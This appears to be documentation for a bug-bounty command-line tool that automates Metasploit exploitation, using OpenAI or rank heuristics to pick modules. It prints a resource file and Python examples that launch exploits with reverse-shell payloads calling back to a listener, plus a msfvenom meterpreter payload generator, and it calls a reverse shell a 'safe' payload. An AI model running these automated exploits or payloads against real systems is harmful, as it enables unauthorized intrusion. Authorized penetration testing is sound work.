# Metasploit Integration with AI

This document explains how Bug Bounty CLI integrates Metasploit Framework with AI for intelligent, automated exploitation.

## Overview

The Metasploit integration combines:
- **Automated vulnerability discovery** (via scanners)
- **AI-powered exploit selection** (via OpenAI)
- **Automated exploitation** (via Metasploit Framework)

This creates a fully automated penetration testing workflow that can discover, analyze, and exploit vulnerabilities with minimal manual intervention.

## Prerequisites

### 1. Install Metasploit Framework

On Kali Linux:
```bash
sudo apt-get update
sudo apt-get install metasploit-framework
```

Verify installation:
```bash
msfconsole --version
msfvenom --version
```

### 2. Configure API Keys (Optional)

**OpenAI API key is completely optional!** Metasploit integration works with or without it.

**With OpenAI API Key:**
```env
OPENAI_API_KEY=sk-your-api-key-here
```
- AI will intelligently select the best Metasploit module
- AI can generate custom exploit payloads

**Without OpenAI API Key:**
- Metasploit module selection uses heuristic-based ranking (by exploit rank)
- All scanning and exploitation features still work
- No AI exploit generation, but Metasploit exploits still execute

## Usage

### Basic Pentest with Metasploit

```bash
bugbounty pentest --target https://example.com --metasploit
```

This will:
1. Scan for vulnerabilities
2. For each vulnerability found, search Metasploit database
3. Use AI to select the best exploit module
4. Attempt exploitation automatically
5. Report results with session information

### Advanced Usage

**High-intensity scan with all features:**
```bash
bugbounty pentest \
  --target https://example.com \
  --intensity extreme \
  --ai-exploits \
  --metasploit \
  --output pentest_report.html
```

**Without Metasploit (manual exploit testing only):**
```bash
bugbounty pentest \
  --target https://example.com \
  --no-metasploit \
  --ai-exploits
```

**Custom intensity levels:**
```bash
# Low intensity (fewer payloads, faster)
bugbounty pentest --target https://example.com --intensity low --metasploit

# Extreme intensity (comprehensive testing, slower)
bugbounty pentest --target https://example.com --intensity extreme --metasploit
```

## How It Works

### 1. Vulnerability Discovery

The scanner identifies vulnerabilities using:
- Nmap for reconnaissance
- SQLMap for SQL injection
- Nikto for web server vulnerabilities
- Custom scanners for OWASP Top 10

### 2. Metasploit Module Search

For each vulnerability, the system:
- Searches Metasploit database by CVE ID
- Searches by vulnerability type (RCE, SQLi, XSS, etc.)
- Searches by detected technology (PHP, Apache, WordPress, etc.)

Example search terms generated:
```
CVE-2023-12345
remote code execution
php
apache 2.4
```

### 3. Module Selection (AI or Heuristic)

**With OpenAI API Key:** AI analyzes all matching modules and selects the best one based on:

**Exploit Ranking:**
- Excellent (most reliable)
- Great
- Good
- Normal
- Average
- Low
- Manual (requires interaction)

**Relevance Score:**
- Match to vulnerability type
- Target platform compatibility
- Disclosure date recency

**Example AI Decision:**
```
Found 5 modules:
1. exploit/multi/http/php_upload_exec (Rank: excellent)
2. exploit/unix/webapp/php_rce (Rank: good)
3. exploit/linux/http/apache_mod_cgi (Rank: normal)
4. auxiliary/scanner/http/php_version (Rank: normal)
5. post/multi/gather/php_config (Rank: manual)

AI Selected: #1 (exploit/multi/http/php_upload_exec)
Reason: Highest rank, direct match to RCE vulnerability, supports target OS
```

**Without OpenAI API Key:** Heuristic selection based on exploit rank:
```
Found 5 modules:
1. exploit/multi/http/php_upload_exec (Rank: excellent)
2. exploit/unix/webapp/php_rce (Rank: good)  
3. exploit/linux/http/apache_mod_cgi (Rank: normal)
4. auxiliary/scanner/http/php_version (Rank: normal)
5. post/multi/gather/php_config (Rank: manual)

Selected: #1 (exploit/multi/http/php_upload_exec)
Reason: Highest exploit rank (excellent)
```

### 4. Automated Exploitation

The system generates a Metasploit resource file:

```ruby
use exploit/multi/http/php_upload_exec
set RHOSTS example.com
set RPORT 80
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 127.0.0.1
set LPORT 4444
set TARGETURI /vulnerable-endpoint
exploit -z
sessions -l
exit
```

Executes via:
```bash
msfconsole -q -r /tmp/exploit_rc_file.rc
```

### 5. Result Analysis

Parses Metasploit output for:
- **Success indicators**: "session X opened", "meterpreter", "shell"
- **Session ID**: Extracted from output
- **Access level**: Shell vs Meterpreter vs Failed
- **Error messages**: Connection refused, exploit failed, etc.

## Output Examples

### Successful Exploitation

```
[✓] Vulnerability found: Remote Code Execution in PHP upload
[*] Searching Metasploit modules...
[*] Found 3 relevant modules
[*] AI selecting optimal module...
[*] Selected: exploit/multi/http/php_upload_exec (Rank: excellent)
[*] Executing exploit against example.com:80
[✓] Metasploit exploit successful!
[✓] Session ID: 1
[✓] Access Level: meterpreter

Impact: CRITICAL
Full system access achieved via Metasploit. Meterpreter session 1 opened.
Attacker has complete control over the target system.
```

### Failed Exploitation

```
[✓] Vulnerability found: SQL Injection in login form
[*] Searching Metasploit modules...
[*] Found 2 relevant modules
[*] AI selecting optimal module...
[*] Selected: exploit/multi/http/sqli_login_bypass
[*] Executing exploit against example.com:443
[✗] Metasploit exploit failed: Connection refused by target
[*] Falling back to manual exploit testing...
```

## Security Considerations

### Safe Payloads

By default, the system uses non-destructive payloads:
- `cmd/unix/reverse_netcat` - Simple reverse shell
- No file system modification
- No data destruction
- No persistence mechanisms

### Timeouts

All exploits have timeouts to prevent hanging:
- Search: 30 seconds
- Exploitation: 60 seconds

### Isolation

Exploits run in isolated resource files that are automatically cleaned up after execution.

### Session Management

Metasploit sessions are:
- Created in background (`exploit -z`)
- Listed for reference
- NOT automatically interacted with
- Terminated when msfconsole exits

## Troubleshooting

### Metasploit Not Found

```
[WARNING] Metasploit not found. Exploit functionality limited.
```

**Solution:**
```bash
# Install Metasploit
sudo apt-get install metasploit-framework

# Update database
msfdb init
msfconsole -x "db_rebuild_cache; exit"
```

### AI Selection Not Used

```
[INFO] Using heuristic-based module selection (OpenAI not configured)
```

**This is normal!** The tool works fine without AI. Modules are selected by:
- Exploit rank (excellent > great > good > normal > average > low)
- Alphabetical order for same rank

**To enable AI selection:** Add `OPENAI_API_KEY` to your `.env` file (optional).

### No Modules Found

```
[*] No Metasploit modules found for vulnerability
```

**Reasons:**
- Vulnerability is too new (no public exploits)
- Vulnerability type not in Metasploit database
- Search terms didn't match any modules

**What happens:** Falls back to manual exploit testing

### Exploit Timeout

```
[ERROR] Metasploit exploit timed out
```

**Reasons:**
- Target not responding
- Exploit requires more time
- Network connectivity issues

**Solution:** Check target availability, increase timeout in code if needed

## Advanced Features

### Custom Payloads

Modify `_select_payload_for_vulnerability()` in `pentest_engine.py`:

```python
def _select_payload_for_vulnerability(self, vuln: Vulnerability) -> str:
    payload_map = {
        "rce": "linux/x64/meterpreter/reverse_tcp",  # More powerful
        "sqli": "cmd/unix/reverse_netcat",
        "default": "cmd/unix/reverse_netcat"
    }
    return payload_map.get(vuln.type, payload_map["default"])
```

### msfvenom Integration

Generate standalone payloads:

```python
from src.testing.metasploit_integrator import MetasploitIntegrator

msf = MetasploitIntegrator()

# Generate reverse shell payload
payload_file = msf.generate_payload(
    payload_type="linux/x64/meterpreter/reverse_tcp",
    lhost="192.168.1.100",
    lport=4444,
    format="elf"
)

print(f"Payload saved to: {payload_file}")
```

### Direct Module Execution

```python
from src.testing.metasploit_integrator import MetasploitIntegrator, MetasploitModule

msf = MetasploitIntegrator()

# Create module manually
module = MetasploitModule(
    name="exploit/unix/webapp/php_rce",
    path="exploit/unix/webapp/php_rce",
    description="PHP Remote Code Execution",
    rank="excellent"
)

# Execute against target
result = msf.exploit_vulnerability(
    vulnerability=vuln_object,
    module=module,
    target_host="192.168.1.50",
    target_port=80,
    payload="cmd/unix/reverse_netcat",
    lhost="192.168.1.100",
    lport=4444
)

if result.success:
    print(f"Session opened: {result.session_id}")
```

## Best Practices

1. **Always get authorization** before testing any target
2. **Use in controlled environments** first (labs, intentionally vulnerable apps)
3. **Review AI selections** - AI can make mistakes
4. **Monitor resource consumption** - Metasploit can be CPU/memory intensive
5. **Clean up sessions** after testing
6. **Document all exploits** attempted for compliance
7. **Use VPNs/isolated networks** for testing
8. **Never run against production** without explicit approval

## Legal Warning

⚠️ **CRITICAL: This tool performs active exploitation**

Using Metasploit to exploit systems without authorization is:
- **Illegal** in most jurisdictions
- **Punishable by criminal charges**
- **Violation of computer fraud laws**

Only use this tool:
- On systems you own
- On systems you have written permission to test
- In authorized penetration testing engagements
- For educational purposes in lab environments

## References

- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Bug Bounty Methodology](https://github.com/jhaddix/tbhm)
